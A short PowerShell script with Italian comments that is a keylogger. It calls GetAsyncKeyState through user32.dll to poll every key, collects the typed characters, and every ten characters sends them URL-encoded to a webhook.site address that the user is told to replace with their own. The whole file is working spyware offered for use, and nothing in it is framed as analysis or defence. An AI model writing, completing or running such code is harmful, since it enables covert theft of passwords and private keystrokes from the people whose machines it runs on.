# Funzione per fare l'encoding dell'URL
function UrlEncode {
    param([string]$value)
    $encoded = [System.Uri]::EscapeDataString($value)
    return $encoded
}

$webhook = "https://webhook.site/your-webhook-id"  # Sostituisci con il tuo Webhook
$log = ""

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@

while ($true) {
    Start-Sleep -Milliseconds 50
    for ($ascii = 8; $ascii -le 255; $ascii++) {
        if ([Keyboard]::GetAsyncKeyState($ascii) -ne 0) {
            $key = [char]$ascii
            $log += $key
            if ($log.Length -ge 10) {  # Invia i dati ogni 10 caratteri
                # Codifica i caratteri premuti
                $encodedLog = UrlEncode $log

                # Crea l'URL per la richiesta GET
                $url = "$webhook?keys=$encodedLog"
                Write-Host "Invio: $url"  # Debug per vedere l'URL costruito

                # Invia la richiesta GET al webhook
                $uri = New-Object System.Uri($url)
                $request = [System.Net.HttpWebRequest]::Create($uri)
                $request.Method = "GET"

                # Ottieni la risposta e chiudi
                $response = $request.GetResponse()
                $response.Close()

                # Resetta il log dopo l'invio
                $log = ""
            }
        }
    }
}
